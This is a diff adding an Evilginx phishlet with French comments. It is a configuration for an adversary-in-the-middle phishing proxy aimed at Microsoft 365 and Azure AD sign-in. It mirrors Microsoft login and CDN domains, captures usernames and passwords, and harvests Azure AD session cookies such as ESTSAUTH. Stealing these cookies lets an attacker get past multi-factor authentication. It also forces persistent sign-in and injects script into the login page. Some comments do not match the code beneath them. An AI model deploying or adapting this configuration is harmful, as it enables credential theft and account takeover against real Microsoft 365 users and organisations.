@@ -1,0 +1,229 @@
+##########################################################
+# PHISHLET MICROSOFT 365 - EVILGINX PRO
+# Configuration complète pour Office 365 / Azure AD
+##########################################################
+
+name: "microsoft365"
+author: "@breakdev"
+min_ver: "3.0.0"
+
+##########################################################
+# PROXY HOSTS
+##########################################################
+proxy_hosts:
+  # Authentification principale Azure AD
+  - phish_sub: "login"
+    orig_sub: "login"
+    domain: "microsoftonline.com"
+    session: true
+    is_landing: true
+    auto_filter: true
+
+  # Endpoints d'authentification
+  - phish_sub: "autologon"
+    orig_sub: "autologon"
+    domain: "microsoftonline.com"
+    session: true
+    is_landing: false
+
+  # APIs Microsoft
+  - phish_sub: "aadcdn"
+    orig_sub: "aadcdn"
+    domain: "msftauth.net"
+    session: false
+    is_landing: false
+
+  - phish_sub: "aadcdn"
+    orig_sub: "aadcdn"
+    domain: "msauth.net"
+    session: false
+    is_landing: false
+
+  # Ressources statiques
+  - phish_sub: "logincdn"
+    orig_sub: "logincdn"
+    domain: "msftauth.net"
+    session: false
+    is_landing: false
+
+  # Office portals
+  - phish_sub: "www"
+    orig_sub: "www"
+    domain: "office.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "portal"
+    orig_sub: "portal"
+    domain: "office.com"
+    session: false
+    is_landing: false
+
+##########################################################
+# SUB FILTERS
+##########################################################
+sub_filters:
+  # Login Microsoft
+  - triggers_on: "login.microsoftonline.com"
+    orig_sub: "login"
+    domain: "microsoftonline.com"
+    search: "login.microsoftonline.com"
+    replace: "{hostname}"
+    mimes: ["text/html", "application/json", "application/javascript"]
+
+  - triggers_on: "login.microsoftonline.com"
+    orig_sub: "login"
+    domain: "microsoftonline.com"
+    search: "https://login.microsoftonline.com"
+    replace: "https://{hostname}"
+    mimes: ["text/html", "application/json"]
+
+  # Autologon
+  - triggers_on: "login.microsoftonline.com"
+    orig_sub: "autologon"
+    domain: "microsoftonline.com"
+    search: "autologon.microsoftonline.com"
+    replace: "{hostname}"
+    mimes: ["text/html", "application/json"]
+
+  # CDN Resources
+  - triggers_on: "login.microsoftonline.com"
+    orig_sub: "aadcdn"
+    domain: "msftauth.net"
+    search: "aadcdn.msftauth.net"
+    replace: "{hostname}"
+    mimes: ["text/html", "text/css", "application/javascript"]
+
+  - triggers_on: "login.microsoftonline.com"
+    orig_sub: "aadcdn"
+    domain: "msauth.net"
+    search: "aadcdn.msauth.net"
+    replace: "{hostname}"
+    mimes: ["text/html", "application/javascript"]
+
+  - triggers_on: "login.microsoftonline.com"
+    orig_sub: "logincdn"
+    domain: "msftauth.net"
+    search: "logincdn.msftauth.net"
+    replace: "{hostname}"
+    mimes: ["text/html", "text/css"]
+
+##########################################################
+# AUTH TOKENS
+##########################################################
+auth_tokens:
+  # Tokens de session Azure AD
+  - domain: ".login.microsoftonline.com"
+    keys:
+      - "ESTSAUTH" # Primary auth token
+      - "ESTSAUTHPERSISTENT" # Persistent auth token
+      - "ESTSAUTHLIGHT" # Light auth token
+      - "SignInStateCookie" # Sign-in state
+      - "buid" # Browser unique ID
+      - "x-ms-gateway-slice" # Gateway routing
+
+  # Cookies de session Office
+  - domain: ".microsoftonline.com"
+    keys:
+      - "ESTSAUTH"
+      - "ESTSAUTHPERSISTENT"
+
+  # Tokens Office 365
+  - domain: ".office.com"
+    keys:
+      - "OfficeHome.Consent"
+      - "MC0"
+      - "MC1"
+
+##########################################################
+# CREDENTIALS
+##########################################################
+credentials:
+  # Email/UPN
+  username:
+    key: "login"
+    search: "(.*)"
+    type: "post"
+
+  # Mot de passe
+  password:
+    key: "passwd"
+    search: "(.*)"
+    type: "post"
+
+##########################################################
+# LOGIN
+##########################################################
+login:
+  domain: "login.microsoftonline.com"
+  path: "/common/oauth2/authorize"
+
+##########################################################
+# FORCE POST
+##########################################################
+force_post:
+  - path: "/common/login"
+    search:
+      - { key: "login", search: "(.*)" }
+      - { key: "passwd", search: "(.*)" }
+    force:
+      - { key: "login", value: "{login}" }
+      - { key: "passwd", value: "{passwd}" }
+    type: "post"
+
+  - path: "/kmsi"
+    search:
+      - { key: "LoginOptions", search: "(.*)" }
+    force:
+      - { key: "LoginOptions", value: "3" }
+    type: "post"
+
+##########################################################
+# JS INJECT (Pro)
+##########################################################
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/authorize", "/common/login"]
+    script: |
+      // Contournement détection Microsoft
+      console.log('MS365 phishing active');
+
+      // Forcer l'option "Rester connecté"
+      if (document.getElementById('idBtn_Back')) {
+        document.getElementById('idBtn_Back').style.display = 'none';
+      }
+
+##########################################################
+# AUTH URLS
+##########################################################
+auth_urls:
+  - "/common/oauth2/authorize"
+  - "/common/login"
+  - "/common/SAS/ProcessAuth"
+  - "/common/federation/oauth2"
+  - "/kmsi"
+  - "/GetCredentialType"
+
+##########################################################
+# LANDING URLS
+##########################################################
+landing_urls:
+  - "https://portal.office.com"
+  - "https://www.office.com"
+  - "https://outlook.office.com/mail"
+  - "https://teams.microsoft.com"
+  - "/common/oauth2/v2.0/authorize"
+##########################################################
+# NOTES
+##########################################################
+# Microsoft 365 utilise Azure AD pour l'authentification
+# Le flow d'auth peut varier selon :
+# - Authentification fédérée (ADFS, Okta, etc.)
+# - MFA (SMS, Authenticator, etc.)
+# - Conditional Access policies
+#
+# Ce phishlet capture :
+# - Email/UPN et password
+# - Tokens de session Azure AD
+# - Cookies persistants Office 365
+##########################################################
